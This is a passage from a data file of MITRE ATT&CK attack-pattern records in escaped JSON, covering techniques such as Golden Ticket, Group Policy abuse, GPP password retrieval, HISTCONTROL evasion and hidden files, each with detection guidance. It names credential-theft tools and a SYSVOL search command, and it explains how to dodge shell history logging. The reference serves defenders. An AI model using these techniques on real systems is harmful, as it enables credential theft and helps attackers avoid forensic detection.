Bypass\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Process command-line parameters\"],\"x_mitre_defense_bypassed\":[\"Application control\",\"Anti-virus\"],\"x_mitre_detection\":\"Monitoring for the removal of the <code>com.apple.quarantine</code> flag by a user instead of the operating system is a suspicious action and should be examined further. Monitor and investigate attempts to modify extended file attributes with utilities such as <code>xattr</code>. Built-in system utilities may generate high false positive alerts, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\",\"Administrator\"],\"x_mitre_platforms\":[\"macOS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-11T19:13:33.643Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries who have the KRBTGT account password hash may forge Kerberos ticket-granting tickets (TGT), also known as a golden ticket.(Citation: AdSecurity Kerberos GT Aug 2015) Golden tickets enable adversaries to generate authentication material for any account in Active Directory.(Citation: CERT-EU Golden Ticket Protection) \\n\\nUsing a golden ticket, adversaries are then able to request ticket granting service (TGS) tickets, which enable access to specific resources. Golden tickets require adversaries to interact with the Key Distribution Center (KDC) in order to obtain TGS.(Citation: ADSecurity Detecting Forged Tickets)\\n\\nThe KDC service runs all on domain controllers that are part of an Active Directory domain. KRBTGT is the Kerberos Key Distribution Center (KDC) service account and is responsible for encrypting and signing all Kerberos tickets.(Citation: ADSecurity Kerberos and KRBTGT) The KRBTGT password hash may be obtained using [OS Credential Dumping](https://attack.mitre.org/techniques/T1003) and privileged access to a domain controller.\",\"external_references\":[{\"external_id\":\"T1558.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1558/001\"},{\"description\":\"Metcalf, S. (2015, August 7). Kerberos Golden Tickets are Now More Golden. Retrieved December 1, 2017.\",\"source_name\":\"AdSecurity Kerberos GT Aug 2015\",\"url\":\"https://adsecurity.org/?p=1640\"},{\"description\":\"Abolins, D., Boldea, C., Socha, K., Soria-Machado, M. (2016, April 26). Kerberos Golden Ticket Protection. Retrieved July 13, 2017.\",\"source_name\":\"CERT-EU Golden Ticket Protection\",\"url\":\"https://cert.europa.eu/static/WhitePapers/UPDATED%20-%20CERT-EU_Security_Whitepaper_2014-007_Kerberos_Golden_Ticket_Protection_v1_4.pdf\"},{\"description\":\"Metcalf, S. (2015, May 03). Detecting Forged Kerberos Ticket (Golden Ticket & Silver Ticket) Use in Active Directory. Retrieved December 23, 2015.\",\"source_name\":\"ADSecurity Detecting Forged Tickets\",\"url\":\"https://adsecurity.org/?p=1515\"},{\"description\":\"Sean Metcalf. (2014, November 10). Kerberos & KRBTGT: Active Directory’s Domain Kerberos Service Account. Retrieved January 30, 2020.\",\"source_name\":\"ADSecurity Kerberos and KRBTGT\",\"url\":\"https://adsecurity.org/?p=483\"},{\"description\":\"Jeff Warren. (2019, February 19). How to Detect Pass-the-Ticket Attacks. Retrieved February 27, 2020.\",\"source_name\":\"Stealthbits Detect PtT 2019\",\"url\":\"https://blog.stealthbits.com/detect-pass-the-ticket-attacks\"},{\"description\":\"Microsoft. (2015, March 24). Kerberos Golden Ticket Check (Updated). Retrieved February 27, 2020.\",\"source_name\":\"Microsoft Kerberos Golden Ticket\",\"url\":\"https://gallery.technet.microsoft.com/scriptcenter/Kerberos-Golden-Ticket-b4814285\"}],\"id\":\"attack-pattern--768dce68-8d0d-477a-b01d-0eea98b963a1\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-03-31T12:59:10.840Z\",\"name\":\"Golden Ticket\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Authentication logs\",\"Windows event logs\"],\"x_mitre_detection\":\"Monitor for anomalous Kerberos activity, such as malformed or blank fields in Windows logon/logoff events (Event ID 4624, 4672, 4634), RC4 encryption within TGTs, and TGS requests without preceding TGT requests.(Citation: ADSecurity Kerberos and KRBTGT)(Citation: CERT-EU Golden Ticket Protection)(Citation: Stealthbits Detect PtT 2019)\\n\\nMonitor the lifetime of TGT tickets for values that differ from the default domain duration.(Citation: Microsoft Kerberos Golden Ticket)\\n\\nMonitor for indications of [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003) being used to move laterally. \\n\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:50.342Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"**This technique has been deprecated. Please use [Remote Services](https://attack.mitre.org/techniques/T1021) where appropriate.**\\n\\nThe Graphical User Interfaces (GUI) is a common way to interact with an operating system. Adversaries may use a system\'s GUI during an operation, commonly through a remote interactive session such as [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1076), instead of through a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059), to search for information and execute files via mouse double-click events, the Windows Run command (Citation: Wikipedia Run Command), or other potentially difficult to monitor interactions.\",\"external_references\":[{\"external_id\":\"T1061\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1061\"},{\"description\":\"Wikipedia. (2018, August 3). Run Command. Retrieved October 12, 2018.\",\"source_name\":\"Wikipedia Run Command\",\"url\":\"https://en.wikipedia.org/wiki/Run_command\"}],\"id\":\"attack-pattern--a6525aec-acc4-47fe-92f9-b9b4de4b9228\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"execution\"}],\"modified\":\"2020-03-30T13:38:08.738Z\",\"name\":\"Graphical User Interface\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Process monitoring\",\"Process command-line parameters\",\"Binary file metadata\"],\"x_mitre_deprecated\":true,\"x_mitre_detection\":\"Detection of execution through the GUI will likely lead to significant false positives. Other factors should be considered to detect misuse of services that can lead to adversaries gaining access to systems through interactive remote sessions. \\n\\nUnknown or unusual process launches outside of normal behavior on a particular system occurring through remote interactive sessions are suspicious. Collect and audit security logs that may indicate access to and use of Legitimate Credentials to access remote systems within the network.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\",\"Administrator\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_remote_support\":true,\"x_mitre_version\":\"2.0\"}",
    "{\"created\":\"2019-03-07T14:10:32.650Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predicable network path <code>\\\\\\\\&lt;DOMAIN&gt;\\\\SYSVOL\\\\&lt;DOMAIN&gt;\\\\Policies\\\\</code>.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) \\n\\nLike other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.\\n\\nMalicious GPO modifications can be used to implement many other malicious behaviors such as [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001), [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105), [Create Account](https://attack.mitre.org/techniques/T1136), [Service Execution](https://attack.mitre.org/techniques/T1035),  and more.(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)(Citation: Mandiant M Trends 2016)(Citation: Microsoft Hacking Team Breach) Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.(Citation: Wald0 Guide to GPOs)\\n\\nFor example, publicly available scripts such as <code>New-GPOImmediateTask</code> can be leveraged to automate the creation of a malicious [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) by modifying GPO settings, in this case modifying <code>&lt;GPO_PATH&gt;\\\\Machine\\\\Preferences\\\\ScheduledTasks\\\\ScheduledTasks.xml</code>.(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <code>&lt;GPO_PATH&gt;\\\\MACHINE\\\\Microsoft\\\\Windows NT\\\\SecEdit\\\\GptTmpl.inf</code>, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary\'s control would then be able to modify GPOs.(Citation: Harmj0y SeEnableDelegationPrivilege Right)\\n\",\"external_references\":[{\"external_id\":\"T1484\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1484\"},{\"description\":\"srachui. (2012, February 13). Group Policy Basics – Part 1: Understanding the Structure of a Group Policy Object. Retrieved March 5, 2019.\",\"source_name\":\"TechNet Group Policy Basics\",\"url\":\"https://blogs.technet.microsoft.com/musings_of_a_technical_tam/2012/02/13/group-policy-basics-part-1-understanding-the-structure-of-a-group-policy-object/\"},{\"description\":\"Metcalf, S. (2016, March 14). Sneaky Active Directory Persistence #17: Group Policy. Retrieved March 5, 2019.\",\"source_name\":\"ADSecurity GPO Persistence 2016\",\"url\":\"https://adsecurity.org/?p=2716\"},{\"description\":\"Robbins, A. (2018, April 2). A Red Teamer’s Guide to GPOs and OUs. Retrieved March 5, 2019.\",\"source_name\":\"Wald0 Guide to GPOs\",\"url\":\"https://wald0.com/?p=179\"},{\"description\":\"Schroeder, W. (2016, March 17). Abusing GPO Permissions. Retrieved March 5, 2019.\",\"source_name\":\"Harmj0y Abusing GPO Permissions\",\"url\":\"http://www.harmj0y.net/blog/redteaming/abusing-gpo-permissions/\"},{\"description\":\"Mandiant. (2016, February 25). Mandiant M-Trends 2016. Retrieved March 5, 2019.\",\"source_name\":\"Mandiant M Trends 2016\",\"url\":\"https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/rpt-mtrends-2016.pdf\"},{\"description\":\"Microsoft Secure Team. (2016, June 1). Hacking Team Breach: A Cyber Jurassic Park. Retrieved March 5, 2019.\",\"source_name\":\"Microsoft Hacking Team Breach\",\"url\":\"https://www.microsoft.com/security/blog/2016/06/01/hacking-team-breach-a-cyber-jurassic-park/\"},{\"description\":\"Schroeder, W. (2017, January 10). The Most Dangerous User Right You (Probably) Have Never Heard Of. Retrieved March 5, 2019.\",\"source_name\":\"Harmj0y SeEnableDelegationPrivilege Right\",\"url\":\"http://www.harmj0y.net/blog/activedirectory/the-most-dangerous-user-right-you-probably-have-never-heard-of/\"}],\"id\":\"attack-pattern--ebb42bbe-62d7-47d7-a55f-3b08b61d792d\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-03-26T21:17:41.231Z\",\"name\":\"Group Policy Modification\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Itamar Mizrahi, Cymptom\",\"Tristan Bennett, Seamless Intelligence\"],\"x_mitre_data_sources\":[\"Windows event logs\"],\"x_mitre_defense_bypassed\":[\"System access controls\",\"File system access controls\"],\"x_mitre_detection\":\"It is possible to detect GPO modifications by monitoring directory service changes using Windows event logs. Several events may be logged for such GPO modifications, including:\\n\\n* Event ID 5136 - A directory service object was modified\\n* Event ID 5137 - A directory service object was created\\n* Event ID 5138 - A directory service object was undeleted\\n* Event ID 5139 - A directory service object was moved\\n* Event ID 5141 - A directory service object was deleted\\n\\n\\nGPO abuse will often be accompanied by some other behavior such as [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), which will have events associated with it to detect. Subsequent permission value modifications, like those to SeEnableDelegationPrivilege, can also be searched for in events associated with privileges assigned to new logons (Event ID 4672) and assignment of user rights (Event ID 4704). \",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"Administrator\",\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2020-02-11T18:43:06.253Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to find unsecured credentials in Group Policy Preferences (GPP). GPP are tools that allow administrators to create domain policies with embedded credentials. These policies allow administrators to set local accounts.(Citation: Microsoft GPP 2016)\\n\\nThese group policies are stored in SYSVOL on a domain controller. This means that any domain user can view the SYSVOL share and decrypt the password (using the AES key that has been made public).(Citation: Microsoft GPP Key)\\n\\nThe following tools and scripts can be used to gather and decrypt the password file from Group Policy Preference XML files:\\n\\n* Metasploit’s post exploitation module: <code>post/windows/gather/credentials/gpp</code>\\n* Get-GPPPassword(Citation: Obscuresecurity Get-GPPPassword)\\n* gpprefdecrypt.py\\n\\nOn the SYSVOL share, adversaries may use the following command to enumerate potential GPP XML files: <code>dir /s * .xml</code>\\n\",\"external_references\":[{\"external_id\":\"T1552.006\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1552/006\"},{\"description\":\"Microsoft. (2016, August 31). Group Policy Preferences. Retrieved March 9, 2020.\",\"source_name\":\"Microsoft GPP 2016\",\"url\":\"https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/dn581922(v%3Dws.11)\"},{\"description\":\"Microsoft. (n.d.). 2.2.1.1.4 Password Encryption. Retrieved April 11, 2018.\",\"source_name\":\"Microsoft GPP Key\",\"url\":\"https://msdn.microsoft.com/library/cc422924.aspx\"},{\"description\":\"Campbell, C. (2012, May 24). GPP Password Retrieval with PowerShell. Retrieved April 11, 2018.\",\"source_name\":\"Obscuresecurity Get-GPPPassword\",\"url\":\"https://obscuresecurity.blogspot.co.uk/2012/05/gpp-password-retrieval-with-powershell.html\"},{\"description\":\"Sean Metcalf. (2015, December 28). Finding Passwords in SYSVOL & Exploiting Group Policy Preferences. Retrieved February 17, 2020.\",\"source_name\":\"ADSecurity Finding Passwords in SYSVOL\",\"url\":\"https://adsecurity.org/?p=2288\"}],\"id\":\"attack-pattern--8d7bd4f5-3a89-4453-9c82-2c8894d5655e\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-06-17T14:25:38.082Z\",\"name\":\"Group Policy Preferences\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Windows event logs\"],\"x_mitre_detection\":\"Monitor for attempts to access SYSVOL that involve searching for XML files. \\n\\nDeploy a new XML file with permissions set to Everyone:Deny and monitor for Access Denied errors.(Citation: ADSecurity Finding Passwords in SYSVOL)\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"external_references\":[{\"external_id\":\"T1148\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1148\"},{\"external_id\":\"CAPEC-13\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/13.html\"}],\"id\":\"attack-pattern--086952c4-5b90-4185-b573-02bad8e11953\",\"modified\":\"2020-02-21T20:57:38.015Z\",\"name\":\"HISTCONTROL\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-02-21T20:56:06.498Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may configure <code>HISTCONTROL</code> to not log all command history. The <code>HISTCONTROL</code> environment variable keeps track of what should be saved by the <code>history</code> command and eventually into the <code>~/.bash_history</code> file when a user logs out. <code>HISTCONTROL</code> does not exist by default on macOS, but can be set by the user and will be respected.\\n\\nThis setting can be configured to ignore commands that start with a space by simply setting it to \\\"ignorespace\\\". <code>HISTCONTROL</code> can also be set to ignore duplicate commands by setting it to \\\"ignoredups\\\". In some Linux systems, this is set by default to \\\"ignoreboth\\\" which covers both of the previous examples. This means that “ ls” will not be saved, but “ls” would be saved by history.\\n\\n Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands.\",\"external_references\":[{\"external_id\":\"T1562.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1562/003\"},{\"external_id\":\"CAPEC-13\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/13.html\"}],\"id\":\"attack-pattern--8f504411-cb96-4dac-a537-8d2bb7679c59\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-29T22:09:18.020Z\",\"name\":\"HISTCONTROL\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Environment variable\",\"File monitoring\",\"Authentication logs\",\"Process monitoring\"],\"x_mitre_defense_bypassed\":[\"Host forensic analysis\",\"Log analysis\"],\"x_mitre_detection\":\"Correlating a user session with a distinct lack of new commands in their <code>.bash_history</code> can be a clue to suspicious behavior. Additionally, users checking or changing their <code>HISTCONTROL</code> environment variable is also suspicious.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2018-04-18T17:59:24.739Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may introduce computer accessories, computers, or networking hardware into a system or network that can be used as a vector to gain access. While public references of usage by APT groups are scarce, many penetration testers leverage hardware additions for initial access. Commercial and open source products are leveraged with capabilities such as passive network tapping (Citation: Ossmann Star Feb 2011), man-in-the middle encryption breaking (Citation: Aleks Weapons Nov 2015), keystroke injection (Citation: Hak5 RubberDuck Dec 2016), kernel memory reading via DMA (Citation: Frisk DMA August 2016), adding new wireless access to an existing network (Citation: McMillan Pwn March 2012), and others.\",\"external_references\":[{\"external_id\":\"T1200\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1200\"},{\"description\":\"Michael Ossmann. (2011, February 17). Throwing Star LAN Tap. Retrieved March 30, 2018.\",\"source_name\":\"Ossmann Star Feb 2011\",\"url\":\"https://ossmann.blogspot.com/2011/02/throwing-star-lan-tap.html\"},{\"description\":\"Nick Aleks. (2015, November 7). Weapons of a Pentester - Understanding the virtual & physical tools used by white/black hat hackers. Retrieved March 30, 2018.\",\"source_name\":\"Aleks Weapons Nov 2015\",\"url\":\"http://www.bsidesto.ca/2015/slides/Weapons_of_a_Penetration_Tester.pptx\"},{\"description\":\"Hak5. (2016, December 7). Stealing Files with the USB Rubber Ducky – USB Exfiltration Explained. Retrieved March 30, 2018.\",\"source_name\":\"Hak5 RubberDuck Dec 2016\",\"url\":\"https://www.hak5.org/blog/main-blog/stealing-files-with-the-usb-rubber-ducky-usb-exfiltration-explained\"},{\"description\":\"Ulf Frisk. (2016, August 5). Direct Memory Attack the Kernel. Retrieved March 30, 2018.\",\"source_name\":\"Frisk DMA August 2016\",\"url\":\"https://www.youtube.com/watch?v=fXthwl6ShOg\"},{\"description\":\"Robert McMillan. (2012, March 3). The Pwn Plug is a little white box that can hack your network. Retrieved March 30, 2018.\",\"source_name\":\"McMillan Pwn March 2012\",\"url\":\"https://arstechnica.com/information-technology/2012/03/the-pwn-plug-is-a-little-white-box-that-can-hack-your-network/\"}],\"id\":\"attack-pattern--d40239b3-05ff-46d8-9bdd-b46d13463ef9\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"initial-access\"}],\"modified\":\"2019-07-17T21:35:06.932Z\",\"name\":\"Hardware Additions\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Asset management\",\"Data loss prevention\"],\"x_mitre_detection\":\"Asset management systems may help with the detection of computer systems or network devices that should not exist on a network. \\n\\nEndpoint sensors may be able to detect the addition of hardware via USB, Thunderbolt, and other external device communication ports.\",\"x_mitre_platforms\":[\"Windows\",\"Linux\",\"macOS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-06-28T22:55:55.719Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may use a hidden file system to conceal malicious activity from users and security tools. File systems provide a structure to store and access data from physical storage. Typically, a user engages with a file system through applications that allow them to access files and directories, which are an abstraction from their physical location (ex: disk sector). Standard file systems include FAT, NTFS, ext4, and APFS. File systems can also contain other structures, such as the Volume Boot Record (VBR) and Master File Table (MFT) in NTFS.(Citation: MalwareTech VFS Nov 2014)\\n\\nAdversaries may use their own abstracted file system, separate from the standard file system present on the infected system. In doing so, adversaries can hide the presence of malicious components and file input/output from security tools. Hidden file systems, sometimes referred to as virtual file systems, can be implemented in numerous ways. One implementation would be to store a file system in reserved disk space unused by disk structures or standard file system partitions.(Citation: MalwareTech VFS Nov 2014)(Citation: FireEye Bootkits) Another implementation could be for an adversary to drop their own portable partition image as a file on top of the standard file system.(Citation: ESET ComRAT May 2020) Adversaries may also fragment files across the existing file system structure in non-standard ways.(Citation: Kaspersky Equation QA)\",\"external_references\":[{\"external_id\":\"T1564.005\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1564/005\"},{\"description\":\"Hutchins, M. (2014, November 28). Virtual File Systems for Beginners. Retrieved June 22, 2020.\",\"source_name\":\"MalwareTech VFS Nov 2014\",\"url\":\"https://www.malwaretech.com/2014/11/virtual-file-systems-for-beginners.html\"},{\"description\":\"Andonov, D., et al. (2015, December 7). Thriving Beyond The Operating System: Financial Threat Group Targets Volume Boot Record. Retrieved May 13, 2016.\",\"source_name\":\"FireEye Bootkits\",\"url\":\"https://www.fireeye.com/blog/threat-research/2015/12/fin1-targets-boot-record.html\"},{\"description\":\"Faou, M. (2020, May). From Agent.btz to ComRAT v4: A ten-year journey. Retrieved June 15, 2020.\",\"source_name\":\"ESET ComRAT May 2020\",\"url\":\"https://www.welivesecurity.com/wp-content/uploads/2020/05/ESET_Turla_ComRAT.pdf\"},{\"description\":\"Kaspersky Lab\'s Global Research and Analysis Team. (2015, February). Equation Group: Questions and Answers. Retrieved December 21, 2015.\",\"source_name\":\"Kaspersky Equation QA\",\"url\":\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064459/Equation_group_questions_and_answers.pdf\"}],\"id\":\"attack-pattern--dfebc3b7-d19d-450b-81c7-6dafe4184c04\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-29T15:12:11.024Z\",\"name\":\"Hidden File System\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Windows Registry\"],\"x_mitre_detection\":\"Detecting the use of a hidden file system may be exceptionally difficult depending on the implementation. Emphasis may be placed on detecting related aspects of the adversary lifecycle, such as how malware interacts with the hidden file system or how a hidden file system is loaded. Consider looking for anomalous interactions with the Registry or with a particular file on disk. Likewise, if the hidden file system is loaded on boot from reserved disk space, consider shifting focus to detecting [Bootkit](https://attack.mitre.org/techniques/T1542/003) activity.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\",\"Administrator\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"external_references\":[{\"external_id\":\"T1158\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1158\"},{\"description\":\"Dani Creus, Tyler Halfpop, Robert Falcone. (2016, September 26). Sofacy\'s \'Komplex\' OS X Trojan. Retrieved July 8, 2017.\",\"source_name\":\"Sofacy Komplex Trojan\",\"url\":\"https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/\"},{\"description\":\"Thomas Reed. (2017, January 18). New Mac backdoor using antiquated code. Retrieved July 5, 2017.\",\"source_name\":\"Antiquated Mac Malware\",\"url\":\"https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/\"},{\"description\":\"Claud Xiao. (n.d.). WireLurker: A New Era in iOS and OS X Malware. Retrieved July 10, 2017.\",\"source_name\":\"WireLurker\",\"url\":\"https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/reports/Unit_42/unit42-wirelurker.pdf\"}],\"id\":\"attack-pattern--dc27c2ec-c5f9-4228-ba57-d67b590bda93\",\"modified\":\"2020-03-13T21:01:22.966Z\",\"name\":\"Hidden Files and Directories\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-02-26T17:46:13.128Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls –a</code> for Linux and macOS).\\n\\nOn Linux and Mac, users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folders that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable.\\n\\nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker). On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.\\n\\nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.\",\"external_references\":[{\"external_id\":\"T1564.001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1564/001\"},{\"description\":\"Dani Creus, Tyler Halfpop, Robert Falcone. (2016, September 26). Sofacy\'s \'Komplex\' OS X Trojan. Retrieved July 8, 2017.\",\"source_name\":\"Sofacy Komplex Trojan\",\"url\":\"https://researchcenter.paloaltonetworks.com/2016/09/unit42-sofacys-komplex-os-x-trojan/\"},{\"description\":\"Thomas Reed. (2017, January 18). New Mac backdoor using antiquated code. Retrieved July 5, 2017.\",\"source_name\":\"Antiquated Mac Malware\",\"url\":\"https://blog.malwarebytes.com/threat-analysis/2017/01/new-mac-backdoor-using-antiquated-code/\"},{\"description\":\"Claud Xiao. (n.d.). WireLurker: A New Era in iOS and OS X Malware. Retrieved July 10, 2017.\",\"source_name\":\"WireLurker\",\"url\":\"https://www.paloaltonetworks.com/content/dam/pan/en_US/assets/pdf/reports/Unit_42/unit42-wirelurker.pdf\"}],\"id\":\"attack-pattern--ec8fc7e2-b356-455c-8db5-2e37be158e7d\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-29T22:32:25.985Z\",\"name\":\"Hidden Files and Directories\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\",\"File monitoring\"],\"x_mitre_defense_bypassed\":[\"Host forensic analysis\"],\"x_mitre_detection\":\"Monitor the file system and shell commands for files being created with a leading \\\".\\\" and the Windows command-line use of attrib.exe to add the hidden attribute.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Windows\",\"macOS\",\"Linux\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"external_references\":[{\"external_id\":\"T1147\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1147\"},{\"description\":\"Amit Serper. (2016). Cybereason Lab Analysis OSX.Pirrit. Retrieved July 8, 2017.\",\"source_name\":\"Cybereason OSX Pirrit\",\"url\":\"https://www2.cybereason.com/research-osx-pirrit-mac-os-x-secuirty\"}],\"id\":\"attack-pattern--ce73ea43-8e77-47ba-9c11-5e9c9c58b9ff\",\"modified\":\"2020-03-13T21:02:19.830Z\",\"name\":\"Hidden Users\",\"revoked\":true,\"type\":\"attack-pattern\"}",
